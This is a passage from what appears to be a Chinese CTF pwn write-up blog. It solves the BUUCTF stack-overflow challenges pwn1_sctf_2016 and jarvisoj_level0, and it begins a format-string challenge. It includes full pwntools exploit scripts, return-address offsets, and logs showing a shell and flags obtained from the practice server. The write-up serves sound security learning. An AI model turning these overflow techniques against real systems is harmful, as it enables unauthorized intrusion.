+</span></span><span class=line><span class=cl>    Arch:       i386-32-little
+</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
+</span></span><span class=line><span class=cl>    Stack:      No canary found
+</span></span><span class=line><span class=cl>    NX:         NX enabled
+</span></span><span class=line><span class=cl>    PIE:        No PIE (0x8048000)
+</span></span><span class=line><span class=cl>    Stripped:   No
+</span></span></code></pre></td></tr></table></div></div><p>32位</p><p><code>main</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>vuln</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>vuln</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=nf>vuln</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>v0</span><span class=p>;</span> <span class=c1>// eax
+</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span> <span class=c1>// [esp+1Ch] [ebp-3Ch] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v3</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span> <span class=c1>// [esp+3Ch] [ebp-1Ch] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v4</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span> <span class=c1>// [esp+40h] [ebp-18h] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [esp+47h] [ebp-11h] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v6</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span> <span class=c1>// [esp+48h] [ebp-10h] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v7</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span> <span class=c1>// [esp+4Fh] [ebp-9h] BYREF
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Tell me something about yourself: &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>fgets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=n>edata</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=k>operator</span><span class=o>=</span><span class=p>(</span><span class=o>&amp;</span><span class=n>input</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::</span><span class=n>allocator</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>string</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span> <span class=s>&#34;you&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::</span><span class=n>allocator</span><span class=p>(</span><span class=n>v7</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>string</span><span class=p>(</span><span class=n>v6</span><span class=p>,</span> <span class=s>&#34;I&#34;</span><span class=p>,</span> <span class=n>v7</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>replace</span><span class=p>((</span><span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=o>*</span><span class=p>)</span><span class=n>v3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=k>operator</span><span class=o>=</span><span class=p>(</span><span class=o>&amp;</span><span class=n>input</span><span class=p>,</span> <span class=n>v3</span><span class=p>,</span> <span class=n>v6</span><span class=p>,</span> <span class=n>v4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>v6</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::~</span><span class=n>allocator</span><span class=p>(</span><span class=n>v7</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::~</span><span class=n>string</span><span class=p>(</span><span class=n>v4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::~</span><span class=n>allocator</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v0</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>std</span><span class=o>::</span><span class=n>string</span><span class=o>::</span><span class=n>c_str</span><span class=p>((</span><span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>strcpy</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>v0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>printf</span><span class=p>(</span><span class=s>&#34;So, %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>(cpp反编译真难看。。)</p><p>注意到其中定义v4、v6分别为<code>you</code>、<code>I</code>，同时在<code>replace</code>函数中被调用（v3），所以猜测应该是替换<code>input</code>内容中的<code>I</code>为<code>you</code>。</p><p><code>fgets()</code>内容缓冲区长度为32；<code>s</code>位于3C（esp+1Ch ebp-3Ch），也就是3*16+12=60字节长度；32位程序（Arch:i386-32-little），所以返回地址长度是4；</p><p>需要通过溢出fgets()来覆盖s和返回地址，但是fgets()缓冲区只有32，我们却需要60+4=64，该怎么办呢？</p><p>这时就可以利用<code>replace()</code>了！一个<code>I</code>1长度换3长度的<code>you</code>，我们最多就可以得到32*3=109的长度了！但我们只需要64长度，64/3=21余1:。</p><p>所以先构建payload的一部分：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;I&#39;</span> <span class=o>*</span> <span class=mi>21</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>这样就实现了覆盖s与返回地址了，接下来就差shellcode了：</p><p><code>get_flag</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=nf>get_flag</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>system</span><span class=p>(</span><span class=s>&#34;cat flag.txt&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span> <span class=c1>; int get_flag()
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span>                 <span class=no>public</span> <span class=no>get_flag</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span> <span class=no>get_flag</span>        <span class=no>proc</span> <span class=no>near</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span> <span class=c1>; __unwind {
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0D</span>                 <span class=no>push</span>    <span class=no>ebp</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F0E</span>                 <span class=no>mov</span>     <span class=no>ebp</span><span class=p>,</span> <span class=no>esp</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F10</span>                 <span class=no>sub</span>     <span class=no>esp</span><span class=p>,</span> <span class=mi>18</span><span class=no>h</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F13</span>                 <span class=no>mov</span>     <span class=no>dword</span> <span class=no>ptr</span> <span class=p>[</span><span class=no>esp</span><span class=p>],</span> <span class=no>offset</span> <span class=no>command</span> <span class=c1>; &#34;cat flag.txt&#34;
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F1A</span>                 <span class=no>call</span>    <span class=no>_system</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F1F</span>                 <span class=no>leave</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F20</span>                 <span class=no>retn</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F20</span> <span class=c1>; } // starts at 8048F0D
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>08048</span><span class=nf>F20</span> <span class=no>get_flag</span>        <span class=no>endp</span>
+</span></span></code></pre></td></tr></table></div></div><p>注意到shellcode地址为<code>8048F13</code>，所以构建后半部分shellcode:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x8048F13</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到最终脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>29992</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;I&#39;</span> <span class=o>*</span> <span class=mi>21</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x8048F13</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>拿下！</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PS D:<span class=se>\B</span>23<span class=se>\V</span>SC<span class=se>\H</span>5<span class=se>\k</span>oishi.521514.xyz&gt; <span class=p>&amp;</span> <span class=s2>&#34;D:/Program Files/python/python.exe&#34;</span> d:/CTF/项目/BUU/pwn/pwn1_sctf_2016/hack.py
+</span></span><span class=line><span class=cl><span class=o>[</span>x<span class=o>]</span> Opening connection to node5.buuoj.cn on port <span class=m>29992</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>x<span class=o>]</span> Opening connection to node5.buuoj.cn on port 29992: Trying 117.21.200.176
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Opening connection to node5.buuoj.cn on port 29992: Done
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
+</span></span><span class=line><span class=cl>flag<span class=o>{</span>87ce8c15-cb0e-4149-8980-f5ca1a9e1573<span class=o>}</span>
+</span></span><span class=line><span class=cl>timeout: the monitored <span class=nb>command</span> dumped core
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
+</span></span></code></pre></td></tr></table></div></div><h2 id=jarvisoj_level0-read>jarvisoj_level0 (read())</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] &#39;/home/wuko233/Projects/pwn/jarvisoj_level0/level0&#39;
+</span></span><span class=line><span class=cl>    Arch:       amd64-64-little
+</span></span><span class=line><span class=cl>    RELRO:      No RELRO
+</span></span><span class=line><span class=cl>    Stack:      No canary found
+</span></span><span class=line><span class=cl>    NX:         NX enabled
+</span></span><span class=line><span class=cl>    PIE:        No PIE (0x400000)
+</span></span><span class=line><span class=cl>    Stripped:   No
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Hello, World</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mh>0xDuLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>vulnerable_function</span><span class=p>(</span><span class=mi>1LL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>size_t</span> <span class=nf>vulnerable_function</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>128</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-80h] BYREF
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x200uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>注意到<code>read()</code>函数，可以溢出，<code>buf</code>缓冲区大小为128，64位程序，所以返回地址长度8。</p><p>构建前半部分payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>128</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>注意到shellcode<code>callsystem</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span> <span class=c1>; int callsystem()
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span>                 <span class=nf>public</span> <span class=no>callsystem</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span> <span class=nf>callsystem</span>      <span class=no>proc</span> <span class=no>near</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span> <span class=c1>; __unwind {
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400596</span>                 <span class=nf>push</span>    <span class=no>rbp</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000400597</span>                 <span class=nf>mov</span>     <span class=no>rbp</span><span class=p>,</span> <span class=no>rsp</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>000000000040059</span><span class=nf>A</span>                 <span class=no>mov</span>     <span class=no>edi</span><span class=p>,</span> <span class=no>offset</span> <span class=no>command</span> <span class=c1>; &#34;/bin/sh&#34;
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>000000000040059</span><span class=nf>F</span>                 <span class=no>call</span>    <span class=no>_system</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004005</span><span class=nf>A4</span>                 <span class=no>pop</span>     <span class=no>rbp</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004005</span><span class=nf>A5</span>                 <span class=no>retn</span>
+</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004005</span><span class=nf>A5</span> <span class=c1>; } // starts at 400596
+</span></span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004005</span><span class=nf>A5</span> <span class=no>callsystem</span>      <span class=no>endp</span>
+</span></span></code></pre></td></tr></table></div></div><p>地址为<code>40059A</code>，所以后半部分为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40059A</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>完整：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>25201</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>128</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40059A</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>拿下！</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PS C:<span class=se>\U</span>sers<span class=se>\r</span>oot&gt; <span class=p>&amp;</span> <span class=s2>&#34;D:/Program Files/python/python.exe&#34;</span> //wsl.localhost/Debian/home/wuko233/Projects/pwn/jarvisoj_level0/hack.py
+</span></span><span class=line><span class=cl><span class=o>[</span>x<span class=o>]</span> Opening connection to node5.buuoj.cn on port <span class=m>25201</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>x<span class=o>]</span> Opening connection to node5.buuoj.cn on port 25201: Trying 117.21.200.176
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Opening connection to node5.buuoj.cn on port 25201: Done
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
+</span></span><span class=line><span class=cl>Hello, World
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>bin
+</span></span><span class=line><span class=cl>boot
+</span></span><span class=line><span class=cl>dev
+</span></span><span class=line><span class=cl>etc
+</span></span><span class=line><span class=cl>flag
+</span></span><span class=line><span class=cl>flag.txt
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>tmp
+</span></span><span class=line><span class=cl>usr
+</span></span><span class=line><span class=cl>var
+</span></span><span class=line><span class=cl>cat flag.txt
+</span></span><span class=line><span class=cl>flag<span class=o>{</span>ab0c2d86-23b2-4460-b29f-a7d2975812d6<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=第五空间2019-决赛pwn5-字符串格式化漏洞>[第五空间2019 决赛]PWN5 (字符串格式化漏洞)</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] &#39;/home/wuko233/Projects/pwn/[第五空间2019 决赛]PWN5/pwn&#39;
+</span></span><span class=line><span class=cl>    Arch:       i386-32-little
+</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
+</span></span><span class=line><span class=cl>    Stack:      Canary found
+</span></span><span class=line><span class=cl>    NX:         NX enabled
+</span></span><span class=line><span class=cl>    PIE:        No PIE (0x8048000)
+</span></span></code></pre></td></tr></table></div></div><p>注意到：</p><p><strong>RELRO: Partial RELRO</strong></p><p><strong>Stack: Canary found</strong></p><p>这很坏了，开启了栈保护（Canary），传统的栈溢出覆盖返回地址的方式会被检测到，导致程序终止。因此需要先泄露Canary值，或者寻找其他漏洞点。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
